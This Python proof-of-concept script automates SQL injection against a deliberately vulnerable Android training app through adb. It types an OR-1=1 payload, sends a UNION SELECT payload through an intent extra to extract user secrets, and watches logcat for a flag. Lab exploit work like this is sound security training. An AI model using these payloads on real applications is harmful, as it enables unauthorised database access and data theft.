#!/usr/bin/env python3
import subprocess
import threading
import time
import re
import sys

def monitor_logcat():
    """Monitor logcat for SQL injection results"""
    try:
        process = subprocess.Popen(['adb', 'logcat', '-c'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        process.wait()
        
        process = subprocess.Popen(['adb', 'logcat'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        
        while True:
            line = process.stdout.readline()
            if not line:
                break
            
            # Look for SQL injection success indicators
            if "Flag{SQL_Injection_Success}" in line:
                print(f"[SUCCESS] SQL Injection worked: {line.strip()}")
                return True
            elif "SQLException" in line or "SQLiteException" in line:
                print(f"[INFO] SQL Error detected: {line.strip()}")
            elif "VulnerApp" in line and ("User:" in line or "Secret:" in line):
                print(f"[DATA] Database content leaked: {line.strip()}")
                
    except Exception as e:
        print(f"[ERROR] Logcat monitoring failed: {e}")
    return False

def launch_sql_injection_activity():
    """Launch the SQLInjectionActivity"""
    try:
        cmd = ['adb', 'shell', 'am', 'start', '-n', 'com.dlh.vulnerapp/.SQLInjectionActivity']
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        
        if result.returncode == 0:
            print("[INFO] SQLInjectionActivity launched successfully")
            return True
        else:
            print(f"[ERROR] Failed to launch activity: {result.stderr}")
            return False
    except Exception as e:
        print(f"[ERROR] Activity launch failed: {e}")
        return False

def send_sql_injection_payload():
    """Send SQL injection payloads via UI automation"""
    payloads = [
        "'OR'1'='1",  # Basic OR injection
    ]
    
    for payload in payloads:
        print(f"[ATTACK] Sending payload: {payload}")
        
        # Clear the search input
        subprocess.run(['adb', 'shell', 'input', 'tap', '500', '400'], capture_output=True)
        time.sleep(0.5)
        subprocess.run(['adb', 'shell', 'input', 'keyevent', 'KEYCODE_CTRL_A'], capture_output=True)
        subprocess.run(['adb', 'shell', 'input', 'keyevent', 'KEYCODE_DEL'], capture_output=True)
        
        # Input the SQL injection payload
        # Wrap in double quotes to handle spaces and preserve single quotes
        subprocess.run(['adb', 'shell', 'input', 'text', f'"{payload}"'], capture_output=True)
        time.sleep(0.5)
        
        # Press TAB to focus the Search button, then ENTER to click it
        subprocess.run(['adb', 'shell', 'input', 'keyevent', 'KEYCODE_TAB'], capture_output=True)
        time.sleep(0.2)
        subprocess.run(['adb', 'shell', 'input', 'keyevent', 'KEYCODE_ENTER'], capture_output=True)
        time.sleep(2)
        
        # Check UI for results
        try:
            result = subprocess.run(['adb', 'shell', 'dumpsys', 'activity', 'top'], capture_output=True, text=True)
            if "Flag{SQL_Injection_Success}" in result.stdout:
                print("[SUCCESS] SQL Injection payload successfully extracted flag!")
                return True
        except:
            pass

def main():
    print("[INFO] Starting SQL Injection PoC for VulnerApp")
    
    # Start logcat monitoring in background
    logcat_thread = threading.Thread(target=monitor_logcat, daemon=True)
    logcat_thread.start()
    time.sleep(2)
    
    # Launch the vulnerable activity
    if not launch_sql_injection_activity():
        sys.exit(1)
    
    time.sleep(3)  # Wait for activity to fully load
    
    # Send SQL injection payloads
    send_sql_injection_payload()
    
    print("[INFO] Waiting for results...")
    time.sleep(5)
    
    # Try alternative approach - direct database access via content provider if available
    try:
        # Attempt to trigger SQL injection via intent extras
        cmd = ['adb', 'shell', 'am', 'start', '-n', 'com.dlh.vulnerapp/.SQLInjectionActivity', 
               '--es', 'search_query', "' OR '1'='1' UNION SELECT name,secret FROM users--"]
        subprocess.run(cmd, capture_output=True, text=True)
        time.sleep(2)
    except:
        pass
    
    print("[INFO] PoC execution completed. Check logcat output above for results.")

if __name__ == "__main__":
    main()
